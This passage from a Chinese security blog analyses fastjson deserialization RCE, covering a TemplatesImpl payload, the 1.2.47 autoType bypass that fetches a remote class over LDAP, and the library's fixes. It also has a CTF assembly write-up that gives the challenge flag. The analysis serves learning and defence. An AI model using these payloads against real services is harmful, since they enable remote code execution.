<p>作为 array 里面的元素, object 的 value 都是可以的, 甚至可以作为 key, 会调用 <code>toString</code> 方法作为 JSONObject 的 key.  </p>
<p>所以看了反序列化的流程, 那么挖掘反序列化漏洞, 可以重点看  </p>
<ol>
<li>无参构造器</li>
<li>public 单参数 setter</li>
<li>返回值类型继承 Map, Collection 或者是 AtomicXxxx 的无参 getter 方法</li>
<li>toString</li>
<li>如果是手动调用的 parseObject, 那么 getter 的范围可以扩大</li>
</ol>
<h2 id="TemplateImpl-POC-分析"><a href="#TemplateImpl-POC-分析" class="headerlink" title="TemplateImpl POC 分析"></a>TemplateImpl POC 分析</h2><p>JdbcRowSetImpl 的 POC 比较简单, 一开始就已经分析好了. TemplateImpl 相对比较复杂, 有很多用到了 fastjson 的一些特性, 比如</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE...."</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>其中 _bytecodes 是 private 的, 能赋值成功需要目标开启 Feature.SupportNonPublicField (默认关闭) 才能强制将值赋给 private 的属性. 所以这个 payload 说实话还是图一乐, 估计也就 CTF 用的到.  </p>
<p>另外可以看到 _bytecodes 是 base64 过的, 因为 json 标准里面是不能直接序列化 binary 的, fastjson 对 byte[] 在反序列时会 base64 decode 一下.  </p>
<p>不同与上面的 payload 的是这里触发的就不是 setter 了, 而是我们特别提到过的特殊 getter. 这里是 _outputProperties</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.newTransformer().getOutputProperties();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TransformerConfigurationException var2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而 Properties 继承于 Hashtable, 最后继承到 Map. 完美符合条件, 方法里面的 <code>newTransformer</code> 最后触发 defineTransletClasses, 导致实例化 bytecode, 最后 RCE.<br>这里 _outputProperties 匹配到 getOutputProperties 这个 getter 的原因是匹配时会把 key 里面的 _ 给全部替换为空 (估计是为了方便前端 js 下划线命名可以不用特意替换成驼峰命名), 具体代码分析可以看看底下推荐阅读的 3 号.<br>所以这里 payload 可以写成 outputProperties, 这个 _ 可有可无, 而且在扫描到 _outputProperties 就已经触发, 后面的属性也是多余的… 所以这个 payload 其实等价于</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE...."</span>],<span class="attr">"_name"</span>:<span class="string">"anything"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"outputProperties"</span>:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-25-修复"><a href="#1-2-25-修复" class="headerlink" title="1.2.25 修复"></a>1.2.25 修复</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.2.24</span></span><br><span class="line">Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"><span class="comment">//1.2.25</span></span><br><span class="line">Class&lt;?&gt; clazz = config.checkAutoType(typeName);</span><br></pre></td></tr></table></figure>
<p>不再直接 Class.forName 了, 而是加上了不少限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = derializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">        String accept = acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先是加了一个 Feature, 且默认关闭, 也就是说默认不支持 @type 这种反序列类的方法了. 而且就算打开了, 还有了黑名单, 直接 ban 掉了之前的那两个 payload 的类.</p>
<h2 id="1-2-47-绕过"><a href="#1-2-47-绕过" class="headerlink" title="1.2.47 绕过"></a>1.2.47 绕过</h2><p>在这之间也出现不少绕过, 但是需要手动开始 autoType, 可以看看推荐阅读的 4 号. 而 1.2.47 版本出现的这个绕过就比较牛逼, 不开始 autoType 这个 feature 也能打.</p>
<p>先看 payload </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">        <span class="attr">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">"b"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, </span><br><span class="line">        <span class="attr">"dataSourceName"</span>: <span class="string">"ldap://localhost:1389/Exploit"</span>, </span><br><span class="line">        <span class="attr">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看这个 <code>java.lang.Class</code>, 需要知道一点, fastjson 有很多对内置类的提前做好的反序列化器. 可以在 <code>com.alibaba.fastjson.parser.ParserConfig</code> 的 <code>initDeserializers</code> 的方法看到. 这个方法在类构造时就会被调用, 而其中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...省略</span></span><br><span class="line">deserializers.put(<span class="keyword">boolean</span>.class, BooleanCodec.instance);</span><br><span class="line">deserializers.put(Boolean.class, BooleanCodec.instance);</span><br><span class="line">deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(<span class="keyword">char</span>[].class, <span class="keyword">new</span> CharArrayCodec());</span><br><span class="line"><span class="comment">//...省略</span></span><br></pre></td></tr></table></figure>
<p>在反序列化时会优先使用这些预定义好的反序列器, 如果不存在的话, 才会去调用 <code>createJavaBeanDeserializer</code>, 去读取目标类的 setter, getter, 属性等去反序列化.<br>而对于 Class.class, 反序列化方法是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object objVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">    objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String strVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">    strVal = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到就是将 val 作为类名, 然后用 classloader 去 load 这个 class, 然后返回这个类的 Class 对象.<br>然后回到 fastjson </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123; <span class="comment">// &lt;-- 默认 autoType 关闭, expectClass = null 这一段可以无视</span></span><br><span class="line">    <span class="keyword">long</span> hash = h3;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">        hash ^= className.charAt(i);</span><br><span class="line">        hash *= PRIME;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点在 <code>deserializers.findClass(typeName);</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">findClass</span><span class="params">(String keyString)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; buckets.length; i++) &#123;</span><br><span class="line">        Entry bucket = buckets[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bucket == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K, V&gt; entry = bucket; entry != <span class="keyword">null</span>; entry = entry.next) &#123;</span><br><span class="line">            Object key = bucket.key;</span><br><span class="line">            <span class="keyword">if</span> (key <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                Class clazz = ((Class) key);</span><br><span class="line">                String className = clazz.getName();</span><br><span class="line">                <span class="keyword">if</span> (className.equals(keyString)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个 bucket 就是 put 方法会存进去的 bucket, 所以这里因为是内置类, 其实等价于白名单, 所以直接返回了 clazz, autoType 即使关闭也是可以正常反序列化这些对象的. 比如 Integer, String, URL 等等内置常见对象的.  </p>
<p>而问题也是出在这里, 还记得 Class 的反序列化方式么, 会调用 <code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code>,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>注意 <code>mappings.put(className, clazz)</code>, 如果这个类存在, 会将其放入 TypeUtils 里面的这个缓存中.  </p>
<p>又回到 checkAutoType 中, 注意这个</p>
<p>com.alibaba.fastjson.parser.ParserConfig</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>com.alibaba.fastjson.util.TypeUtils</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了在 deserializers 里面寻找, 还会在 TypeUtils 的缓存里面寻找, 而刚刚我们通过 Class 的反序列化方法, 将我们想要的类放入了缓存中. 这就到达了绕过的效果, 意味着就算我们关闭了 autoType, 照样可以进行利用, 漏洞的发现者 tql.  </p>
<p>这里的本意, 应该是加快速度, 毕竟如果你之前加载过这个类, 当然是在白名单里面的, 但是问题出现在 Class 的反序列器也会调用 loadClass, 这是开发者忘记掉的. 导致恶意类被放入了缓存中, 绕过了检测.  </p>
<h2 id="1-2-48-修复"><a href="#1-2-48-修复" class="headerlink" title="1.2.48 修复"></a>1.2.48 修复</h2><p>对应的修复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将 loadClass 的 cache 设为 false, 这样反序列 Class 对象的时候, 就不会将结果放入缓存中, 自然也就无法绕过 checkAutoType 了.</p>
<h2 id="本文参考-推荐阅读"><a href="#本文参考-推荐阅读" class="headerlink" title="本文参考/推荐阅读"></a>本文参考/推荐阅读</h2><p>[1] <a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a><br>[2] <a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" target="_blank" rel="noopener">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a><br>[3] <a href="https://kingx.me/Details-in-FastJson-RCE.html" target="_blank" rel="noopener">https://kingx.me/Details-in-FastJson-RCE.html</a><br>[4] <a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a>  </p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>一题简单的逆向</title>
    <url>/2018/03/15/%E4%B8%80%E9%A2%98%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<p>第一次尝试看汇编, 因为以前玩过游戏 TIS-100, 所以感觉还不错.  题目: <a href="http://ctf.nuptzj.cn/challenges#ReadAsm2" target="_blank" rel="noopener">http://ctf.nuptzj.cn/challenges#ReadAsm2</a></p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input[] = &#123;<span class="number">0x0</span>,  <span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x7e</span>, <span class="number">0x74</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>,</span><br><span class="line">                  <span class="number">0x55</span>, <span class="number">0x6a</span>, <span class="number">0x7f</span>, <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x4e</span>, <span class="number">0x66</span>, <span class="number">0x7b</span>,</span><br><span class="line">                  <span class="number">0x71</span>, <span class="number">0x4a</span>, <span class="number">0x74</span>, <span class="number">0x76</span>, <span class="number">0x6b</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x66</span> , <span class="number">0x1c</span>&#125;;</span><br><span class="line">  func(input, <span class="number">28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,input+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到这个, 很明显就是看懂func的汇编就行了.  大概意思是这样, 但真的不知道dl是哪里来的233</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">00000000004004e6 &lt;func&gt;:</span><br><span class="line">  4004e6: <span class="number">55</span>                    <span class="keyword">push</span>   <span class="built_in">rbp</span></span><br><span class="line">  4004e7: <span class="number">48</span> <span class="number">89</span> e5              <span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">rsp</span></span><br><span class="line">  4004ea: <span class="number">48</span> <span class="number">89</span> <span class="number">7d</span> e8           <span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x18</span> //char *A ],<span class="built_in">rdi</span></span><br><span class="line">  4004ee: <span class="number">89</span> <span class="number">75</span> e4              <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1c</span> //B 循环次数],<span class="built_in">esi</span></span><br><span class="line">  4004f1: c7 <span class="number">45</span> fc <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span> //C 计次],<span class="number">0x1</span> C=<span class="number">1</span></span><br><span class="line">  4004f8: eb <span class="number">28</span>                 <span class="keyword">jmp</span>    <span class="number">400522</span> &lt;func+<span class="number">0x3c</span>&gt;</span><br><span class="line">//</span><br><span class="line">\* 4004fa: 8b <span class="number">45</span> fc              <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line">\* 4004fd: <span class="number">48</span> <span class="number">63</span> d0              <span class="keyword">movsxd</span> <span class="built_in">rdx</span>,<span class="built_in">eax</span> </span><br><span class="line">\* <span class="number">400500</span>: <span class="number">48</span> 8b <span class="number">45</span> e8           <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x18</span>]</span><br><span class="line">\* <span class="number">400504</span>: <span class="number">48</span> <span class="number">01</span> d0              <span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="built_in">rdx</span> </span><br><span class="line">// 这段不知道有啥用</span><br><span class="line"></span><br><span class="line">  <span class="number">400507</span>: 8b <span class="number">55</span> fc              <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span> //C]</span><br><span class="line">  40050a: <span class="number">48</span> <span class="number">63</span> ca              <span class="keyword">movsxd</span> <span class="built_in">rcx</span>,<span class="built_in">edx</span> </span><br><span class="line">  <span class="number">40050d</span>: <span class="number">48</span> 8b <span class="number">55</span> e8           <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x18</span> //char *A]</span><br><span class="line">  <span class="number">400511</span>: <span class="number">48</span> <span class="number">01</span> ca              <span class="keyword">add</span>    <span class="built_in">rdx</span>,<span class="built_in">rcx</span> //C+A, <span class="built_in">rdx</span>储存地址</span><br><span class="line">  <span class="number">400514</span>: 0f b6 0a              <span class="keyword">movzx</span>  <span class="built_in">ecx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>] //解地址得到char A</span><br><span class="line">  <span class="number">400517</span>: 8b <span class="number">55</span> fc              <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line">  40051a: <span class="number">31</span> ca                 <span class="keyword">xor</span>    <span class="built_in">edx</span>,<span class="built_in">ecx</span> //C^*(C+A)</span><br><span class="line">  40051c: <span class="number">88</span> <span class="number">10</span>                 <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>],<span class="built_in">dl</span> //不知道这里<span class="built_in">dl</span>哪来的, 感觉应该是<span class="built_in">edx</span>. 总之意思是<span class="keyword">xor</span>得到的值放回去. </span><br><span class="line">  40051e: <span class="number">83</span> <span class="number">45</span> fc <span class="number">01</span>           <span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0x1</span> //C++</span><br><span class="line">  </span><br><span class="line">  <span class="number">400522</span>: 8b <span class="number">45</span> fc              <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line">  <span class="number">400525</span>: 3b <span class="number">45</span> e4              <span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1c</span>] //C&gt;B退出循环</span><br><span class="line">  <span class="number">400528</span>: 7e d0                 <span class="keyword">jle</span>    4004fa &lt;func+<span class="number">0x14</span>&gt;</span><br><span class="line">  40052a: <span class="number">90</span>                    <span class="keyword">nop</span></span><br><span class="line">  40052b: <span class="number">5d</span>                    <span class="keyword">pop</span>    <span class="built_in">rbp</span></span><br><span class="line">  40052c: c3                    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<p>看懂以后翻译成高级语言 , 是这样, 相当照顾新手了. </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">char</span>* a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (c &lt;= b)</span><br><span class="line">	&#123;</span><br><span class="line">		*(a + c) = c ^ *(a + c);</span><br><span class="line">		c++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行, 得到flag: flag{read_asm_is_the_basic}</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 PHP Trait 特性绕过 D 盾查杀</title>
    <url>/2019/07/25/%E5%88%A9%E7%94%A8-PHP-Trait-%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87-D-%E7%9B%BE%E6%9F%A5%E6%9D%80/</url>
